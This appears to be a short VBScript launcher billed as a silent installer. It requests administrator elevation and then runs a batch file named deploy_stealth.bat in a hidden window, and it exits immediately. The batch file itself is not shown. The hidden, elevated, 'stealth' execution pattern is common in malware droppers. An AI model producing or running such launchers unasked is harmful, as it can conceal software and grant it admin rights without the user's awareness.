' 100% Silent Installer - No CMD window, No Output, No Flashing
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
strDir = FSO.GetParentFolderName(WScript.ScriptFullName)

' Request Admin elevation if needed
If Not WScript.Arguments.Named.Exists("elevated") Then
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

' Run deploy_stealth.bat non-blocking (False) so VBS exits immediately and releases folder locks
WshShell.Run "cmd.exe /c """ & strDir & "\deploy_stealth.bat""", 0, False
WScript.Quit
